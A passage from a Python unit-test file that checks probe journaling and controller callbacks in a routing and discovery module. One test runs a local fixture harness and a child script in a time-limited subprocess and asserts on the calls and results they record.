            self.discovery.run(["scoped-thread"])
        self.discovery.run(["outside-scope"])
        self.assertEqual(results, [(0, b"probe-output")])
        self.assertEqual([probe["argv"] for probe in self.detailed_probes()],
                         [["other-thread"], ["outside-scope"]])

    def test_router_controller_exception_restores_probe_journaling(self):
        router = Router(self.workspace, "probe-scope", controller=self.controller, discovery=self.discovery)
        self.controller.consult = Mock(side_effect=RuntimeError("controller interruption"))
        with self.assertRaises(RuntimeError):
            router._consult({}, route_round={"routeRevision": 1, "roundNumber": 1})
        self.discovery.run(["after-controller-exception"])
        self.assertEqual(len(self.detailed_probes()), 1)

    def test_real_non_reentrant_controller_callbacks_finish_in_bounded_subprocess(self):
        child_workspace = self.workspace / "bounded-child"
        child_workspace.mkdir()
        harness = child_workspace / "local_harness.py"
        harness.write_text(dedent('''\
            import json
            import sys
            from pathlib import Path
            args = sys.argv[1:]
            with Path("fixture-calls.jsonl").open("a") as target:
                target.write(json.dumps(args) + "\\n")
            if args == ["--version", "--json"]:
                print(json.dumps({"harness": "fixture-0.5.0", "commands": ["capabilities"]}))
            elif args and args[0] == "capabilities":
                print(json.dumps({"version": 1, "query": {"from": args[2], "to": args[4]},
                    "status": "answered", "providers": [json.loads(Path("fixture-provider.json").read_text())]}))
            else:
                print("local-read-only-probe")
            '''))
        child = dedent('''\
            import copy
            import json
            from pathlib import Path
            import sys
            workspace, forge = map(Path, sys.argv[1:3])
            sys.path.insert(0, str(forge))
            sys.path.insert(0, str(forge / "_shared"))
            from decision_control import DecisionController, canonical_digest
            from stage0_route.discovery import Discovery, JEV_EDGE
            from stage0_route.images import png
            from stage0_route.route import Router
            from stage0_route.storage import binding, snapshot
            controller = DecisionController(workspace, "bounded-probe")
            harness = workspace / "local_harness.py"
            discovery = Discovery(controller, harness=(sys.executable, str(harness)),
                auth=(sys.executable, str(harness), "auth-status"))
            row = {"plugin": "jev", "version": "fixture", "resolvedSha": "a" * 40,
                   "dir": str(workspace), "steps": [], "gateRunner": None}
            (workspace / "fixture-provider.json").write_text(json.dumps(row))
            discovery.jev = row
            discovery.jev_status = "present"
            discovery.run((sys.executable, str(harness), "--version", "--json"))
            grant = {"granted": True, "purposes": ["routing", "build-strategy", "quality-review", "repair"],
                     "sha256": "b" * 64, "tokenBudget": 200000}
            def consent():
                code, _ = discovery.run((sys.executable, str(harness), "consent-probe"))
                assert code == 0
                return copy.deepcopy(grant)
            def provider(context):
                assert discovery.query(JEV_EDGE)["status"] == "answered"
                code, _ = discovery.run((sys.executable, str(harness), "provider-probe"))
                assert code == 0
                return {"kind": "img2.decision-advisory", "version": 1, "group": "routing",
                    "subject": context["subject"], "contextDigest": canonical_digest(context),
                    "model": context["requestedModel"], "usage": {"input_tokens": 10, "output_tokens": 2},
                    "answers": {"selection": {"type": "choice", "choice": "candidate-one",
                        "probabilities": {"candidate-one": 1}, "confidence": 1},
                        "anyFits": {"type": "noul", "noul": 1}}}
            (workspace / "reference.png").write_bytes(png(1, 1, 3, b"rgb"))
            reference = binding(workspace, "reference", "reference.png")
            proposal = {"objectId": "prop", "label": "prop", "role": "prop", "approxBox": [0, 0, 1, 1]}
            request = {"expectedOutput": "3d", "intent": [], "explicitRoute": None}
            proposal_ref = snapshot(workspace, "object-proposals",
                {"kind": "img2.object-proposals", "version": 1, "objects": [proposal]})
            inputs = {"reference": reference["sha256"], "request": request,
                "proposals": [proposal], "candidates": [{"id": "base:generic"}],
                "policyVersion": "route-quality-policy-v1", "questionSetVersion": "route-questions-v3",
                "requestedModel": "jev-1.14.0", "consentSnapshotSha256": canonical_digest(grant)}
            initial = snapshot(workspace, "routing-inputs", inputs)
            controller.seal_route_round(route_revision=1, round_number=1, proposal=proposal_ref,
                initial_inputs_digest=initial["sha256"], parent_round_sha256=None, trigger_decision_ids=[])
            router = Router(workspace, "bounded-probe", controller=controller, discovery=discovery,
                            provider=provider, consent=consent)
            context = router._context(proposal, 1,
                [{"id": "candidate-one", "routeId": "base-generic", "outputKind": "3d-object"}],
                [reference, snapshot(workspace, "object-proposal", proposal),
                 snapshot(workspace, "route-request", request),
                 snapshot(workspace, "candidate-handles", {"candidate-one": "base:generic"})], request=request)
            result = router._consult(context, route_round={"routeRevision": 1, "roundNumber": 1})
            discovery.run((sys.executable, str(harness), "--version", "--json"))
            entries = list(map(json.loads, controller.journal_path.read_text().splitlines()))
            detailed = [e for e in entries if e["event"] == "probe" and "argv" in e["data"]]
            authoritative = [e for e in entries if e["event"] == "probe" and e["data"].get("status") == "present"]
            calls = [json.loads(line)[0] for line in (workspace / "fixture-calls.jsonl").read_text().splitlines()]
            print(json.dumps({"status": result["status"], "detailedProbes": len(detailed),
                "authoritativeAvailability": bool(authoritative), "calls": calls, "probeRefs": len(discovery.probes)}))
            ''')
        completed = subprocess.run([sys.executable, "-c", child, str(child_workspace), str(FORGE)],
                                   capture_output=True, text=True, timeout=20, check=False)
        self.assertEqual(completed.returncode, 0, completed.stderr)
        result = json.loads(completed.stdout)
        self.assertEqual(result["status"], "answered")
        self.assertEqual(result["detailedProbes"], 2)
        self.assertEqual(result["probeRefs"], 2)
        self.assertTrue(result["authoritativeAvailability"])
        self.assertTrue({"capabilities", "auth-status", "consent-probe", "provider-probe"} <= set(result["calls"]))


if __name__ == "__main__":
    unittest.main()
